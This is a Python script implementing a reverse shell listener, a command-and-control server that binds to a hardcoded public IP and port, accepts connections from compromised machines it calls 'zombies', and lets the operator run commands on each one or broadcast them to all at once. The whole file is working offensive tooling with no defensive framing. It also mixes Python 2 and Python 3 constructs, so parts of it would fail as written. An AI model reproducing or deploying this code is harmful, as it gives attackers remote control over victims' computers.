#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import Queue  # Python 2-ისთვის queue მოდული Queueა (ზუსტად ასეა დიდი Q-თი)
import signal
import sys
import time

class ReverseShellListener:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.zombies = []
        self.zombie_lock = threading.Lock()
        self.shutdown_flag = False

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def start(self):
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print("[+] Listening on {}:{}".format(self.host, self.port))

            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()

            self.main_menu()

        except Exception as e:
            print("[!] Error starting listener: {}".format(e))
        finally:
            self.cleanup()

    def accept_connections(self):
        while not self.shutdown_flag:
            try:
                client_sock, addr = self.server.accept()
                client_addr = "{}:{}".format(addr[0], addr[1])

                with self.zombie_lock:
                    zombie_id = len(self.zombies) + 1
                    zombie = {
                        "id": zombie_id,
                        "socket": client_sock,
                        "address": client_addr,
                        "thread": None,
                        "queue": Queue.Queue(),
                        "active": True
                    }
                    self.zombies.append(zombie)

                print("[+] New zombie connected: #{} [{}]".format(zombie_id, client_addr))

                handler = threading.Thread(
                    target=self.handle_zombie,
                    args=(zombie,),
                    daemon=True
                )
                handler.start()
                zombie["thread"] = handler

            except Exception as e:
                if not self.shutdown_flag:
                    print("[!] Accept error: {}".format(e))

    def handle_zombie(self, zombie):
        try:
            while zombie["active"] and not self.shutdown_flag:
                try:
                    cmd = zombie["queue"].get_nowait()
                    if cmd == "disconnect":
                        zombie["active"] = False
                        break

                    zombie["socket"].sendall(cmd.encode("utf-8") + b"\r\n")
                    response = self.receive_from_zombie(zombie["socket"])
                    print(response)

                    zombie["queue"].task_done()

                except Queue.Empty:
                    time.sleep(0.1)

        except Exception as e:
            print("[!] Error handling zombie #{}: {}".format(zombie["id"], e))
        finally:
            self.disconnect_zombie(zombie)

    def receive_from_zombie(self, sock):
        buffer_size = 4096
        data = b""
        try:
            while True:
                chunk = sock.recv(buffer_size)
                if not chunk:
                    break
                data += chunk
                if b"$ " in chunk or b"> " in chunk:
                    break
        except Exception as e:
            print("[!] Receive error: {}".format(e))

        try:
            return data.decode("utf-8", errors="replace")
        except Exception:
            return data.encode("hex")  # Python 2-სთვის hex encode

    def disconnect_zombie(self, zombie):
        try:
            zombie["socket"].shutdown(socket.SHUT_RDWR)
            zombie["socket"].close()
        except Exception:
            pass

        with self.zombie_lock:
            if zombie in self.zombies:
                print("[-] Disconnected zombie #{} [{}]".format(zombie["id"], zombie["address"]))
                self.zombies.remove(zombie)

    def main_menu(self):
        while not self.shutdown_flag:
            print("\n--- Main Menu ---")
            print("1. List zombies")
            print("2. Interact with a zombie")
            print("3. Send command to all zombies")
            print("4. Disconnect a zombie")
            print("5. Exit")

            choice = raw_input("\nEnter option: ").strip()

            if choice == "1":
                self.list_zombies()
            elif choice == "2":
                self.interact_with_zombie()
            elif choice == "3":
                self.broadcast_command()
            elif choice == "4":
                self.disconnect_selected_zombie()
            elif choice == "5":
                self.shutdown_flag = True
                print("\nExiting... Please wait for clean shutdown.")
                break
            else:
                print("[!] Invalid option")

    def list_zombies(self):
        print("\n--- Connected Zombies ---")
        with self.zombie_lock:
            if not self.zombies:
                print("No active zombies")
            else:
                print("Total zombies: {}".format(len(self.zombies)))
                for zombie in self.zombies:
                    status = "[ACTIVE]" if zombie["active"] else "[DISCONNECTED]"
                    print("#{} {:<10} - {}".format(zombie["id"], status, zombie["address"]))

    def interact_with_zombie(self):
        try:
            zombie_id = int(raw_input("\nEnter zombie ID to interact with: "))
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["id"] == zombie_id:
                        if not zombie["active"]:
                            print("[!] This zombie is inactive")
                            return

                        print("\nInteracting with zombie #{}".format(zombie_id))
                        print("Type 'back' to return to main menu")

                        while not self.shutdown_flag and zombie["active"]:
                            cmd = raw_input("\nZombie#{}> ".format(zombie_id)).strip()
                            if not cmd:
                                continue
                            if cmd.lower() == "back":
                                break
                            zombie["queue"].put(cmd)
                            zombie["queue"].join()
                        break
                else:
                    print("[!] Zombie not found")

        except ValueError:
            print("[!] Please enter a valid number")

    def broadcast_command(self):
        cmd = raw_input("\nEnter command to broadcast: ").strip()
        if not cmd:
            print("[!] Empty command")
            return

        with self.zombie_lock:
            for zombie in self.zombies:
                if zombie["active"]:
                    zombie["queue"].put(cmd)
                    print("Sent to zombie #{}".format(zombie["id"]))

    def disconnect_selected_zombie(self):
        try:
            zombie_id = int(raw_input("\nEnter zombie ID to disconnect: "))
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["id"] == zombie_id:
                        if zombie["active"]:
                            print("Disconnecting zombie #{}...".format(zombie_id))
                            zombie["queue"].put("disconnect")
                            zombie["queue"].join()
                        else:
                            print("Zombie #{} is already disconnected".format(zombie_id))
                        return
            print("[!] Zombie not found")

        except ValueError:
            print("[!] Please enter a valid number")

    def cleanup(self):
        print("\nCleaning up...")
        self.shutdown_flag = True

        with self.zombie_lock:
            for zombie in self.zombies:
                if zombie["active"]:
                    try:
                        zombie["queue"].put("disconnect")
                        zombie["queue"].join()
                    except Exception:
                        pass

        try:
            self.server.shutdown(socket.SHUT_RDWR)
            self.server.close()
        except Exception:
            pass

        print("Cleanup complete")

    def signal_handler(self, signum, frame):
        print("\nReceived signal {}, shutting down...".format(signum))
        self.shutdown_flag = True

def validate_ip(ip):
    import socket
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port_str):
    try:
        port = int(port_str)
        return 1 <= port <= 65535
    except ValueError:
        return False

if __name__ == "__main__":
    host = "158.69.251.105"  # IP to bind, მაგ: "0.0.0.0"
    port = 54589     # Port to bind

    listener = ReverseShellListener(host=host, port=port)
    listener.start()
